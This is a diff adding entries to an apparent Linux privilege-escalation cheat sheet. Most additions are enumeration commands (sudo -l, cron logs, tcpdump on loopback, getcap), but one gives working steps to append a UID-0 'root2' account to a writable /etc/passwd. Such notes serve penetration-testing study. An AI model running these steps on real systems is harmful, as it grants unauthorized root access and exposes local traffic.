@@ -297,6 +297,13 @@ netstat -ntpl 2>/dev/null
 |Home Folder| "/home/joe" | Describes the user's home directory prompted upon login|
 |Login Shell| "/bin/bash" | Indicates the default interactive shell, if one exists|
 
+*/etc/passwd* shouldn't be word writable. If by any chance this is the case it is possible to add a new privileged user:
+1. Generate a *crypt* hash: `openssl passwd <password>`
+2. Add the new user to */etc/passwd* `echo "root2:<previously_obtained_hash>:0:0:root:/root:/bin/bash" >> /etc/passwd`
+3. Get privileged with `su root2`
+
+This is because in order to achieve backwards compatibility, if a password hash for a user is found on */etc/passwd* file, it is considered valid for auth over the hash for the same user contained on */etc/shadow* (Same happens if there is no entry for the same user on */etc/shadow*).
+
 ```
 # Current user
 whoami
@@ -309,6 +316,11 @@ cat /etc/passwd | grep -v nologin | grep -v /bin/false | cut -d':' -f1  # Displa
 groups # get the groups to which the current user belongs to.
 cat /etc/group # Get all the local groups-
 
+# Environmental variables
+env
+
+# Sudo rights
+sudo -l
 ```
 
 [Back to top](#index)
@@ -325,6 +337,9 @@ uname -a 	# OS Kernel Version and architecture
 
 # DPKG installed apps
 dpkg -l
+
+# As root, verify if AppArmor is loaded (AppArmor is a kernel module that provides mandatory access control (MAC) on Linux systems by running various application-specific profiles)
+aa-status
 ```
 
 [Back to top](#index)
@@ -337,9 +352,21 @@ ps aux	# Processes with tty, including other users (a), in user-oriented format 
 ps -ef	# All process (-e) and in full format listing (-f)
 top
 
+# Execute ps command each second
+watch -n 1 "ps -ef"
+
+# Get the attributes for any process giben its PID
+cat /proc/<PID>/status
+
 # Cron Jobs
 ls -lah /etc/cron*	# List hourly,daily,weekly,monthly cron jobs
 crontab -l	# Running with root (sudo) privileges may impact the results. Scheduled Cron jobs for current user.
+
+# Cron jobs related entries on /var/log/syslog
+grep "CRON" /var/log/syslog
+
+# Inspect cron.log file
+cat /var/log/cron.log
 ```
 
 [Back to top](#index)
@@ -363,11 +390,16 @@ routel
 
 # ARP Table
 arp -v # Get ARP cache
+
+# Capture traffic in lo interface and dump contents in ASCII
+sudo tcpdump -i lo -A 
 ```
 
 [Back to top](#index)
 
 ### FileSystem Related
+
+Once juicy files/binaries are found, time to check [GTFOBins](https://gtfobins.github.io/) to loog for/find privesc ways.
 ```
 # Find writable directories
 find / -writable -type d 2>/dev/null	# To get writable files change -type to *f*
@@ -392,6 +424,9 @@ find / -perm -u=s -type f 2>/dev/null
 
 # Get SGID binaries
 find / -perm -g=s -type f 2>/dev/null
+
+# Get capabilites
+/usr/sbin/getcap -r / 2>/dev/null
 ```
 
 [Back to top](#index)
